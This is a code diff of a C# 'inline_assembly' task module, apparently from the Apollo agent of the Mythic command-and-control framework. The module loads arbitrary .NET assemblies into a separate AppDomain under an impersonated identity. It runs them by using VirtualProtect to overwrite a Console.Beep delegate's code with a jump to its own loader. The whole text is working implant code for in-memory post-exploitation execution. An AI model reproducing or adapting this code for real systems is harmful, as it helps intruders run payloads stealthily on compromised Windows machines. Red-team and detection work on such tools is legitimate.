@@ -20,8 +20,6 @@ using System.Reflection;
 using System.Runtime.CompilerServices;
 using System.Security.Principal;
 using ApolloInterop.Classes.Api;
-using ApolloInterop.Classes.IO;
-using Task = ApolloInterop.Structs.MythicStructs.Task;
 
 namespace Tasks
 {
@@ -63,7 +61,7 @@ namespace Tasks
 
         private Thread _assemblyThread;
         
-        public inline_assembly(IAgent agent, Task task) : base(agent, task)
+        public inline_assembly(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
         {
             _pVirtualProtect = agent.GetApi().GetLibraryFunction<VirtualProtect>(Library.KERNEL32, "VirtualProtect");
             _pCommandLineToArgvW =
@@ -132,8 +130,7 @@ namespace Tasks
                 // ptrToSplitArgs is an array of pointers to null terminated Unicode strings.
                 // Copy each of these strings into our split argument array.
                 for (int i = 0; i < numberOfArgs; i++)
-                    splitArgs[i] = Marshal.PtrToStringUni(
-                        Marshal.ReadIntPtr(ptrToSplitArgs, i * IntPtr.Size));
+                    splitArgs[i] = Marshal.PtrToStringUni(Marshal.ReadIntPtr(ptrToSplitArgs, i * IntPtr.Size));
 
                 return splitArgs;
             }
@@ -155,7 +152,7 @@ namespace Tasks
 
         public override void Start()
         {
-            TaskResponse resp;
+            MythicTaskResponse resp;
             TextWriter realStdOut = Console.Out;
             TextWriter realStdErr = Console.Error;
             try
@@ -191,15 +188,16 @@ namespace Tasks
                         string[] stringData = string.IsNullOrEmpty(parameters.AssemblyArguments)
                             ? new string[0]
                             : ParseCommandLine(parameters.AssemblyArguments);
-                        _sendTask =
-                            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, _cancellationToken.Token);
-                        if (LoadAppDomainModule(stringData, assemblyBytes, new byte[][] {interopBytes}))
+                        
+                        _sendTask = System.Threading.Tasks.Task.Factory.StartNew(_sendAction, _cancellationToken.Token);
+                        (bool loadedModule, string optionalMessage) = LoadAppDomainModule(stringData, assemblyBytes, new byte[][] { interopBytes });
+                        if (loadedModule)
                         {
                             resp = CreateTaskResponse("", true);
                         }
                         else
                         {
-                            resp = CreateTaskResponse("Failed to load module.", true, "error");
+                            resp = CreateTaskResponse($"Failed to load module. \n {optionalMessage}", true, "error");
                         }
                     }
                     else
@@ -238,84 +236,101 @@ namespace Tasks
         }
 
         #region AppDomain Management
-        private bool LoadAppDomainModule(String[] sParams, Byte[] bMod, Byte[][] dependencies)
+        private (bool,string) LoadAppDomainModule(String[] sParams, Byte[] bMod, Byte[][] dependencies)
         {
             bool bRet = false;
             AppDomain isolationDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
-            isolationDomain.SetThreadPrincipal(
-                new WindowsPrincipal(
-                    _agent.GetIdentityManager().GetCurrentImpersonationIdentity()
-                    ));
-            isolationDomain.SetData("str", sParams);
-            bool defaultDomain = AppDomain.CurrentDomain.IsDefaultAppDomain();
-            foreach(byte[] dependency in dependencies)
+            try
             {
-                try
+                isolationDomain.SetThreadPrincipal(new WindowsPrincipal(_agent.GetIdentityManager().GetCurrentImpersonationIdentity()));
+                isolationDomain.SetData("str", sParams);
+                bool defaultDomain = AppDomain.CurrentDomain.IsDefaultAppDomain();
+                foreach (byte[] dependency in dependencies)
                 {
                     isolationDomain.Load(dependency);
-                } catch {}
-            }
-            try
-            {
+                }
                 isolationDomain.Load(bMod);
-            }
-            catch
-            {
-                
-            }
-            var sleeve = new CrossAppDomainDelegate(Console.Beep);
-            var ace = new CrossAppDomainDelegate(ActivateLoader);
+                    /*try
+                    {
+                        isolationDomain.Load(dependency);
+                    }
+                    catch
+                    {
 
-            RuntimeHelpers.PrepareDelegate(sleeve);
-            RuntimeHelpers.PrepareDelegate(ace);
+                    }
+                    }
+                    try
+                    {
+                        isolationDomain.Load(bMod);
+                    }
+                    catch
+                    {
+
+                    }*/
+                var sleeve = new CrossAppDomainDelegate(Console.Beep);
+                var ace = new CrossAppDomainDelegate(ActivateLoader);
+
+                RuntimeHelpers.PrepareDelegate(sleeve);
+                RuntimeHelpers.PrepareDelegate(ace);
 
 
-            var flags = BindingFlags.Instance | BindingFlags.NonPublic;
-            var codeSleeve = (IntPtr)sleeve.GetType().GetField("_methodPtrAux", flags).GetValue(sleeve);
-            var codeAce = (IntPtr)ace.GetType().GetField("_methodPtrAux", flags).GetValue(ace);
+                var flags = BindingFlags.Instance | BindingFlags.NonPublic;
+                var codeSleeve = (IntPtr)sleeve.GetType().GetField("_methodPtrAux", flags).GetValue(sleeve);
+                var codeAce = (IntPtr)ace.GetType().GetField("_methodPtrAux", flags).GetValue(ace);
 
-            if (codeSleeve == IntPtr.Zero || codeAce == IntPtr.Zero)
-            {
-                return bRet;
-            }
-            int[] patch = new int[3];
-
-            patch[0] = 10;
-            patch[1] = 11;
-            patch[2] = 12;
-
-            uint oldprotect = 0;
-            if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), 0x4, out oldprotect))
-            {
-                return bRet;
-            }
-            Marshal.WriteByte(codeSleeve, 0x48);
-            Marshal.WriteByte(IntPtr.Add(codeSleeve, 1), 0xb8);
-            Marshal.WriteIntPtr(IntPtr.Add(codeSleeve, 2), codeAce);
-            Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[0]), 0xff);
-            Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[1]), 0xe0);
-            if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), oldprotect, out oldprotect))
-            {
-                return bRet;
-            }
-            
-            try
-            {
-                _assemblyThread = new Thread(()=>
+                if (codeSleeve == IntPtr.Zero || codeAce == IntPtr.Zero)
                 {
-                    isolationDomain.DoCallBack(sleeve);
-                });
-                _assemblyThread.Start();
-                _assemblyThread.Join();
-                bRet = true;
-            }
-            catch (Exception ex)
-            {
+                    return (bRet, "Failed to get method pointers");
+                }
+                int[] patch = new int[3];
+
+                patch[0] = 10;
+                patch[1] = 11;
+                patch[2] = 12;
+
+                uint oldprotect = 0;
+                if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), 0x4, out oldprotect))
+                {
+                    return (bRet, "Failed to change memory protection");
+                }
+                Marshal.WriteByte(codeSleeve, 0x48);
+                Marshal.WriteByte(IntPtr.Add(codeSleeve, 1), 0xb8);
+                Marshal.WriteIntPtr(IntPtr.Add(codeSleeve, 2), codeAce);
+                Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[0]), 0xff);
+                Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[1]), 0xe0);
+                if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), oldprotect, out oldprotect))
+                {
+                    return (bRet, "Failed to change memory protection");
+                }
                 
+                try
+                {
+                    _assemblyThread = new Thread(() =>
+                    {
+                        isolationDomain.DoCallBack(sleeve);
+                    });
+                    _assemblyThread.Start();
+                    _assemblyThread.Join();
+                    bRet = true;
+                }
+                catch (Exception ex)
+                {
+                    
+                }
+                UnloadAppDomain(isolationDomain);
+                return (bRet,"");
+
             }
-            UnloadAppDomain(isolationDomain);
-            return bRet;
+            catch (Exception e)
+            {
+                return (bRet, e.Message);
+            }
+            finally
+            {
+                UnloadAppDomain(isolationDomain);
+            }
         }
+        
         private static void UnloadAppDomain(AppDomain oDomain)
         {
             AppDomain.Unload(oDomain);
